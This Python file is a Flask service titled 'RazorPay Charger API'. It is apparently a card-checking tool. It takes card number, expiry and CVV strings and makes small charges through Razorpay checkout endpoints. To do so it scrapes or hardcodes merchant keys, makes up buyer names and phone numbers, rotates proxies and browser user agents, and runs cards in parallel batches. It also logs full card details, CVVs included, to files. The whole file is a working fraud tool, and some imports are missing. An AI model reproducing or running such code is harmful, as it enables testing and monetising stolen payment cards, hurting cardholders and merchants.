#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
RazorPay Charger API 
"""

import re
import json
import time
import uuid
import random
import string
import sys
import os
import csv
import threading
from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeoutError
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import logging

# Install missing packages
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system('pip install playwright')
    os.system('playwright install --with-deps chromium')
    from playwright.sync_api import sync_playwright

try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system('pip install beautifulsoup4')
    from bs4 import BeautifulSoup


app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


PARALLEL_WORKERS = 10
PARALLEL_TIMEOUT = 60

_executor = ThreadPoolExecutor(max_workers=PARALLEL_WORKERS)
_active_requests = 0
_request_lock = threading.Lock()

USD_TO_INR_RATE = 83.50
USD_TO_USDT_RATE = 1.0

CURRENCY_RATES = {
    'USD': 1.0,
    'INR': USD_TO_INR_RATE,
    'USDT': USD_TO_USDT_RATE
}

ALLOWED_CURRENCIES = ['USD', 'INR', 'USDT']
AMOUNT_MIN = 1
AMOUNT_MAX = 100

DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6..."

FALLBACK_MERCHANT = {
    'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
    'key_id': 'rzp_live_hrgl3RDoNMvCOs',
    'payment_link_id': 'pl_OzLkvRvf1drPps',
    'payment_page_item_id': 'ppi_OzLkvUeMxfhIbI'
}


class ProxyManager:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.current_index = 0
        self.lock = threading.Lock()
        self.failed_proxies = set()
    
    def load_from_file(self, filename="proxies.txt"):
        try:
            with open(filename, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(self.proxies)} proxies from file")
            return True
        except Exception as e:
            logger.error(f"Failed to load proxies: {e}")
            return False
    
    def load_from_string(self, proxy_string):
        self.proxies = [p.strip() for p in proxy_string.split(',') if p.strip()]
        logger.info(f"Loaded {len(self.proxies)} proxies from string")
        return True
    
    def get_next(self):
        if not self.proxies:
            return None
        with self.lock:
            # Try to find a working proxy
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.current_index % len(self.proxies)]
                self.current_index += 1
                if proxy not in self.failed_proxies:
                    return proxy
                attempts += 1
            # If all proxies failed, reset and try again
            self.failed_proxies.clear()
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            return proxy
    
    def mark_failed(self, proxy):
        with self.lock:
            self.failed_proxies.add(proxy)
    
    def get_playwright_proxy(self):
        proxy_str = self.get_next()
        if not proxy_str:
            return None
        
        parts = proxy_str.split(':')
        if len(parts) == 4:
            ip, port, username, password = [p.strip() for p in parts]
            return {
                "server": f"http://{ip}:{port}",
                "username": username,
                "password": password
            }
        elif len(parts) == 2:
            ip, port = [p.strip() for p in parts]
            return {"server": f"http://{ip}:{port}"}
        elif len(parts) == 3:
            ip, port, username = [p.strip() for p in parts]
            return {
                "server": f"http://{ip}:{port}",
                "username": username,
                "password": ""
            }
        return None

class FingerprintGenerator:
    @staticmethod
    def generate_muid():
        return hashlib.md5(f"{time.time()}{random.random()}{os.urandom(8)}".encode()).hexdigest()[:16]
    
    @staticmethod
    def generate_sid():
        return hashlib.md5(f"{random.randint(100000, 999999)}{time.time()}".encode()).hexdigest()[:16]
    
    @staticmethod
    def generate_guid():
        return str(uuid.uuid4())
    
    @staticmethod
    def get_user_agent():
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
        ]
        return random.choice(agents)
    
    @staticmethod
    def generate_fingerprint():
        return {
            'muid': FingerprintGenerator.generate_muid(),
            'sid': FingerprintGenerator.generate_sid(),
            'guid': FingerprintGenerator.generate_guid(),
            'user_agent': FingerprintGenerator.get_user_agent()
        }


def get_timestamp():
    return datetime.now().strftime("%H:%M:%S")

def get_full_timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def generate_random_user_info():
    first_names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emma', 'James', 'Lisa', 'Robert', 'Maria']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    
    return {
        "name": f"{random.choice(first_names)} {random.choice(last_names)}",
        "email": f"user{random.randint(100, 9999)}@gmail.com",
        "phone": f"9876543{random.randint(100, 999)}",
        "address": f"{random.randint(1, 999)} {random.choice(['Main St', 'Park Ave', 'Oak Rd', 'Maple Dr', 'Cedar Ln'])}",
        "city": random.choice(['Mumbai', 'Delhi', 'Bangalore', 'Chennai', 'Hyderabad']),
        "state": random.choice(['Maharashtra', 'Delhi', 'Karnataka', 'Tamil Nadu', 'Telangana']),
        "zip": str(random.randint(100000, 999999))
    }

def convert_currency(amount, from_currency='USD', to_currency='INR'):
    if from_currency == to_currency:
        return amount
    if from_currency == 'INR':
        usd_amount = amount / USD_TO_INR_RATE
    elif from_currency == 'USDT':
        usd_amount = amount * USD_TO_USDT_RATE
    else:
        usd_amount = amount
    if to_currency == 'INR':
        return round(usd_amount * USD_TO_INR_RATE, 2)
    elif to_currency == 'USDT':
        return round(usd_amount, 2)
    else:
        return round(usd_amount, 2)

def inr_to_paise(inr_amount):
    return int(inr_amount * 100)

def get_masked_card(card_number):
    if len(card_number) >= 10:
        return f"{card_number[:6]}******{card_number[-4:]}"
    return card_number

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip().replace(" ", ""),
        'mes': parts[1].strip().zfill(2),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        ip, port = parts
        return {"server": f"http://{ip}:{port}"}
    elif len(parts) == 4:
        ip, port, user, password = parts
        return {
            "server": f"http://{ip}:{port}",
            "username": user,
            "password": password
        }
    elif len(parts) == 3:
        ip, port, user = parts
        return {
            "server": f"http://{ip}:{port}",
            "username": user,
            "password": ""
        }
    return None

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)

    # Internal/browser errors — return descriptive message, not a token
    browser_keywords = [
        'new_page', 'new_context', 'browser', 'playwright', 'chromium',
        'headless', 'executable', 'target closed', 'browser closed',
        'launch', 'subprocess', 'session token', 'merchant',
        'api_types', 'traceback', 'chromium_launch'
    ]
    msg_lower = message.lower()
    for kw in browser_keywords:
        if kw in msg_lower:
            return message[:80]

    # Razorpay-specific error codes only (uppercase, length 5+)
    razorpay_patterns = [
        r'(PAYMENT_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'(BAD_REQUEST_ERROR)',
        r'(GATEWAY_ERROR)',
        r'(SERVER_ERROR)',
        r'(3DS_[A-Z_]+)',
        r'(AUTH_[A-Z_]+)',
        r'(DECLINE_[A-Z_]+)',
        r'code[\"\'\']?\s*[:=]\s*[\"\'\']?([A-Z_]{5,40})[\"\'\']?',
    ]
    for pattern in razorpay_patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            match = match.strip("{}\'\"\' ")
            if match and "_" in match and 5 <= len(match) <= 50:
                return match.upper()
    return message[:80]

def save_results_to_file(results, filename=None):
    if not results:
        return
    if not filename:
        timestamp = get_full_timestamp()
        filename = f"razorpay_results_{timestamp}"
    
    json_file = f"{filename}.json"
    with open(json_file, 'w') as f:
        json.dump(results, f, indent=2)
    logger.info(f"Results saved to {json_file}")
    
    csv_file = f"{filename}.csv"
    with open(csv_file, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Card', 'Month', 'Year', 'CVV', 'Status', 'Amount_USD', 'Amount_INR', 'Payment_ID', 'Order_ID', 'Time', 'Timestamp'])
        for r in results:
            writer.writerow([
                r.get('card', ''), r.get('month', ''), r.get('year', ''),
                r.get('cvv', ''), r.get('status', ''), r.get('amount_usd', ''),
                r.get('amount_inr', ''), r.get('payment_id', ''), r.get('order_id', ''),
                r.get('time', ''), r.get('timestamp', '')
            ])
    logger.info(f"Results saved to {csv_file}")


_shared_playwright = None
_shared_browser = None
_browser_lock = threading.Lock()

def get_shared_browser(proxy_config=None):
    global _shared_playwright, _shared_browser
    with _browser_lock:
        if _shared_browser is None or not _shared_browser.is_connected():
            try:
                if _shared_browser:
                    _shared_browser.close()
            except Exception:
                pass
            try:
                if _shared_playwright:
                    _shared_playwright.stop()
            except Exception:
                pass
            try:
                _shared_playwright = sync_playwright().start()
                _shared_browser = _shared_playwright.chromium.launch(
                    headless=True,
                    proxy=proxy_config,
                    args=[
                        '--no-sandbox',
                        '--disable-dev-shm-usage',
                        '--disable-gpu',
                        '--disable-setuid-sandbox',
                        '--single-process',
                        '--no-zygote',
                        '--disable-extensions',
                        '--disable-background-networking',
                        '--disable-default-apps',
                        '--disable-sync',
                        '--disable-translate',
                        '--hide-scrollbars',
                        '--metrics-recording-only',
                        '--mute-audio',
                        '--no-first-run',
                        '--safebrowsing-disable-auto-update',
                        '--ignore-certificate-errors',
                        '--ignore-ssl-errors',
                        '--ignore-certificate-errors-spki-list',
                        '--disable-web-security',
                        '--allow-running-insecure-content',
                        '--disable-features=IsolateOrigins,site-per-process',
                        '--shm-size=128m'
                    ]
                )
                # Quick connectivity check
                _test_ctx = _shared_browser.new_context()
                _test_ctx.close()
            except Exception as e:
                _shared_playwright = None
                _shared_browser = None
                raise RuntimeError(f"Chromium launch failed: {str(e)}")
        return _shared_browser

def close_shared_browser():
    global _shared_playwright, _shared_browser
    with _browser_lock:
        try:
            if _shared_browser:
                _shared_browser.close()
        except Exception:
            pass
        try:
            if _shared_playwright:
                _shared_playwright.stop()
        except Exception:
            pass
        _shared_browser = None
        _shared_playwright = None



def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', proxy_str=None, proxy_manager=None):
    """Charge a card via Razorpay using pure requests — no browser needed."""
    import re as _re

    start_time = time.time()
    result = {
        'success': False,
        'card': cc,
        'month': mes,
        'year': ano,
        'cvv': cvv,
        'masked': get_masked_card(cc),
        'amount_usd': 0,
        'amount_inr': 0,
        'currency': currency,
        'payment_id': None,
        'order_id': None,
        'status': 'unknown',
        'error': None,
        'time': 0,
        'gateway': 'RAZORPAY'
    }

    try:
        # 1. Parse card
        card_number = cc.replace(' ', '')
        exp_month   = mes.zfill(2)
        exp_year    = ano if len(ano) == 4 else f'20{ano}'

        # 2. Amount
        if amount == 'random':
            usd_amount = round(random.uniform(AMOUNT_MIN, AMOUNT_MAX), 2)
        else:
            usd_amount = float(amount)
            if not (AMOUNT_MIN <= usd_amount <= AMOUNT_MAX):
                result['error'] = f"Amount must be between {AMOUNT_MIN} and {AMOUNT_MAX} {currency}"
                result['time'] = round(time.time() - start_time, 2)
                return result

        result['amount_usd'] = round(usd_amount, 2)
        inr_amount   = convert_currency(usd_amount, currency, 'INR')
        result['amount_inr'] = round(inr_amount, 2)
        amount_paise = inr_to_paise(inr_amount)

        # 3. Build requests session with browser-like headers
        proxies = None
        if proxy_str:
            proxy_cfg = parse_proxy(proxy_str)
            if proxy_cfg:
                server = proxy_cfg.get('server', '')
                username = proxy_cfg.get('username', '')
                password = proxy_cfg.get('password', '')
                if username:
                    proxies = {
                        'http':  f'http://{username}:{password}@{server.replace("http://","")}',
                        'https': f'http://{username}:{password}@{server.replace("http://","")}'
                    }
                else:
                    proxies = {'http': server, 'https': server}
        elif proxy_manager:
            raw = proxy_manager.get_next()
            if raw:
                cfg = parse_proxy(raw)
                if cfg:
                    srv = cfg.get('server', '')
                    u   = cfg.get('username', '')
                    p2  = cfg.get('password', '')
                    proxies = {
                        'http':  f'http://{u}:{p2}@{srv.replace("http://","")}' if u else srv,
                        'https': f'http://{u}:{p2}@{srv.replace("http://","")}' if u else srv,
                    }

        ua = FingerprintGenerator.get_user_agent()
        sess = requests.Session()
        sess.headers.update({
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        if proxies:
            sess.proxies.update(proxies)

        # 4. Merchant data
        merchant_data = FALLBACK_MERCHANT
        if site_url:
            try:
                r    = sess.get(site_url, timeout=20)
                html = r.text
                kh   = _re.search(r'keyless_header.{0,8}([A-Za-z0-9+/=:]{20,})', html)
                ki   = _re.search(r'(rzp_live_[A-Za-z0-9]+|rzp_test_[A-Za-z0-9]+)', html)
                pl   = _re.search(r'(pl_[A-Za-z0-9]+)', html)
                ppi  = _re.search(r'(ppi_[A-Za-z0-9]+)', html)
                if kh and ki:
                    merchant_data = {
                        'keyless_header':       kh.group(1),
                        'key_id':               ki.group(1),
                        'payment_link_id':      pl.group(1) if pl else FALLBACK_MERCHANT['payment_link_id'],
                        'payment_page_item_id': ppi.group(1) if ppi else FALLBACK_MERCHANT['payment_page_item_id'],
                    }
            except Exception:
                pass  # Use fallback

        keyless_header       = merchant_data.get('keyless_header')
        key_id               = merchant_data.get('key_id')
        payment_link_id      = merchant_data.get('payment_link_id')
        payment_page_item_id = merchant_data.get('payment_page_item_id')

        if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
            result['error'] = 'Missing merchant data'
            result['time'] = round(time.time() - start_time, 2)
            return result

        # 5. User info
        user_info = generate_random_user_info()

        # 6. Get session token via requests
        try:
            st_resp = sess.get(
                'https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1',
                allow_redirects=True, timeout=30
            )
            st_match = _re.search(r'window[.]session_token[\s]*=[\s]*[^A-Fa-f0-9]*([A-Fa-f0-9]{40,})', st_resp.text)
            if st_match:
                session_token = st_match.group(1)
            else:
                # Fallback: try URL param
                session_token = parse_qs(urlparse(st_resp.url).query).get('session_token', [None])[0]
        except Exception as e:
            result['error'] = f'Session token error: {str(e)[:100]}'
            result['time'] = round(time.time() - start_time, 2)
            return result

        if not session_token:
            result['error'] = 'Failed to get session token'
            result['time'] = round(time.time() - start_time, 2)
            return result

        # 7. Create order
        try:
            order_resp = sess.post(
                f'https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order',
                headers={
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Origin': 'https://razorpay.com',
                    'Referer': 'https://razorpay.com/',
                },
                json={
                    'notes': {'comment': ''},
                    'line_items': [{'payment_page_item_id': payment_page_item_id, 'amount': amount_paise}]
                },
                timeout=30
            )
            order_data = order_resp.json()
            order_id   = order_data.get('order', {}).get('id') if isinstance(order_data.get('order'), dict) else None
        except Exception as e:
            result['error'] = f'Order creation error: {str(e)[:100]}'
            result['time'] = round(time.time() - start_time, 2)
            return result

        if not order_id:
            result['error'] = 'Failed to create order'
            result['time'] = round(time.time() - start_time, 2)
            return result

        result['order_id'] = order_id

        # 8. Submit payment
        qs = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
        pay_payload = {
            'notes[comment]': '',
            'payment_link_id': payment_link_id,
            'key_id': key_id,
            'callback_url': 'https://example.com/callback',
            'contact': f"+91{user_info['phone']}",
            'email': user_info['email'],
            'currency': 'INR',
            '_[library]': 'checkoutjs',
            '_[platform]': 'browser',
            'amount': str(amount_paise),
            'order_id': order_id,
            'device_fingerprint[fingerprint_payload]': DEVICE_FINGERPRINT,
            'method': 'card',
            'card[number]': card_number,
            'card[cvv]': cvv,
            'card[name]': user_info['name'],
            'card[expiry_month]': exp_month,
            'card[expiry_year]': exp_year,
            'save': '0',
        }

        try:
            pay_resp = sess.post(
                'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
                params=qs,
                headers={
                    'x-session-token': session_token,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'application/json, text/plain, */*',
                    'Origin': 'https://razorpay.com',
                    'Referer': 'https://razorpay.com/',
                },
                data=pay_payload,
                timeout=45
            )
            try:
                data = pay_resp.json()
            except Exception:
                data = {}
        except Exception as e:
            result['error'] = f'Payment submit error: {str(e)[:100]}'
            result['time'] = round(time.time() - start_time, 2)
            return result

        # 9. Extract payment_id
        payment_id = None
        if isinstance(data, dict):
            meta = data.get('error', {}).get('metadata', {}) if isinstance(data.get('error'), dict) else {}
            payment_id = (
                data.get('payment_id') or
                data.get('razorpay_payment_id') or
                meta.get('payment_id') or
                (data.get('payment', {}) or {}).get('id')
            )

        if payment_id:
            result['payment_id'] = payment_id

        # 10. Parse result
        if isinstance(data, dict):
            # Success signatures
            if data.get('razorpay_signature') or data.get('signature') or data.get('status') in ('captured','authorized'):
                result['success'] = True
                result['status']  = 'payment_success'

            # 3DS redirect
            elif data.get('redirect') or data.get('type') == 'redirect':
                redirect_url = ''
                if isinstance(data.get('request'), dict):
                    redirect_url = data['request'].get('url','')
                if redirect_url:
                    result['status'] = '3ds_redirect'
                    result['error']  = f'3DS redirect required: {redirect_url[:100]}'
                else:
                    result['status'] = 'unknown'
                    result['error']  = '3DS redirect (no URL)'

            # Error from Razorpay
            elif 'error' in data:
                err_obj = data['error']
                if isinstance(err_obj, dict):
                    result['error']  = err_obj.get('description', str(err_obj))
                    result['status'] = 'payment_failed'
                    # Check for specific codes
                    code = err_obj.get('code','')
                    if code:
                        result['error'] = code + ': ' + err_obj.get('description', '')
                else:
                    result['error']  = str(err_obj)
                    result['status'] = 'payment_failed'
            else:
                result['status'] = 'unknown'
                result['error']  = json.dumps(data)[:200]
        else:
            result['status'] = 'payment_failed'
            result['error']  = str(data)[:200]

    except Exception as e:
        result['error']  = str(e)[:200]
        result['status'] = 'error'

    result['time'] = round(time.time() - start_time, 2)
    return result

def charge_batch(cards, site_url, amount=5, currency='USD', max_workers=5, proxy_manager=None):
    results = []
    success_count = 0
    fail_count = 0
    completed = 0
    lock = threading.Lock()
    
    logger.info(f"Processing {len(cards)} cards with {max_workers} threads...")
    
    def process_card(card):
        nonlocal completed, success_count, fail_count
        try:
            parts = parse_cc_string(card)
            result = charge_razorpay_card(
                parts['cc'], parts['mes'], parts['ano'], parts['cvv'],
                site_url, amount, currency, None, proxy_manager
            )
            with lock:
                completed += 1
                if result.get('success'):
                    success_count += 1
                else:
                    fail_count += 1
                results.append(result)
            return result
        except Exception as e:
            with lock:
                completed += 1
                fail_count += 1
                results.append({
                    'success': False,
                    'card': card,
                    'error': str(e),
                    'status': 'error'
                })
            return None
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(process_card, card) for card in cards]
        for future in as_completed(futures):
            future.result()
    
    return {
        'total': len(cards),
        'success': success_count,
        'failed': fail_count,
        'results': results
    }


@app.route('/razorpay', methods=['GET'])
def razorpay_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        amount = request.args.get('amount', 5)
        currency = request.args.get('currency', 'USD')
        
        if not site:
            return jsonify({
                "error": "Missing 'site' parameter",
                "status": False
            }), 400
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts['cc']
            mes = cc_parts['mes']
            ano = cc_parts['ano']
            cvv = cc_parts['cvv']
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False
            }), 400
        
        # Execute charge
        result = charge_razorpay_card(cc, mes, ano, cvv, site, amount, currency, proxy_str)
        
        raw_error = result.get('error', 'UNKNOWN')
        response_data = {
            "Gateway": "RAZORPAY",
            "Price": result.get('amount_usd', 0),
            "Response": extract_clean_response(raw_error),
            "Status": result.get('success', False),
            "cc": cc_string,
            "payment_id": result.get('payment_id'),
            "order_id": result.get('order_id'),
            "amount_inr": result.get('amount_inr', 0),
            "time": result.get('time', 0)
        }
        if not result.get('success', False) and raw_error and raw_error != 'UNKNOWN':
            response_data["error_detail"] = str(raw_error)[:300]
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "RAZORPAY",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500

@app.route('/razorpay_parallel', methods=['GET'])
def razorpay_checker_parallel():
    global _active_requests
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        amount = request.args.get('amount', 5)
        currency = request.args.get('currency', 'USD')
        
        if not site:
            return jsonify({
                "error": "Missing 'site' parameter",
                "status": False
            }), 400
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400
        
        with _request_lock:
            current_active = _active_requests
        
        while current_active >= PARALLEL_WORKERS:
            time.sleep(0.9)
            with _request_lock:
                current_active = _active_requests
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts['cc']
            mes = cc_parts['mes']
            ano = cc_parts['ano']
            cvv = cc_parts['cvv']
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False
            }), 400
        
        with _request_lock:
            _active_requests += 1
        
        try:
            future = _executor.submit(
                charge_razorpay_card,
                cc, mes, ano, cvv, site, amount, currency, proxy_str
            )
            
            result = future.result(timeout=PARALLEL_TIMEOUT)
            
        except FuturesTimeoutError:
            return jsonify({
                "error": "Request timeout",
                "status": False,
                "Gateway": "RAZORPAY",
                "Price": 0.0,
                "Response": "TIMEOUT",
                "cc": cc_string
            }), 504
        except Exception as e:
            return jsonify({
                "error": str(e),
                "status": False,
                "Gateway": "RAZORPAY",
                "Price": 0.0,
                "Response": f"ERROR: {str(e)}",
                "cc": cc_string
            }), 500
        finally:
            with _request_lock:
                _active_requests -= 1
        
        response_data = {
            "Gateway": "RAZORPAY",
            "Price": result.get('amount_usd', 0),
            "Response": extract_clean_response(result.get('error', 'UNKNOWN')),
            "Status": result.get('success', False),
            "cc": cc_string,
            "masked": get_masked_card(cc),
            "payment_id": result.get('payment_id'),
            "order_id": result.get('order_id'),
            "amount_inr": result.get('amount_inr', 0),
            "time": result.get('time', 0),
            "parallel_mode": True,
            "active_requests": _active_requests
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "RAZORPAY",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500


@app.route('/razorpay_health', methods=['GET'])
def razorpay_health():
    return jsonify({
        "status": "online",
        "timestamp": get_full_timestamp(),
        "version": "3.0",
        "mode": "requests_only",
        "browser_status": "not_required"
    })


if __name__ == "__main__":
    import atexit
    atexit.register(close_shared_browser)
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)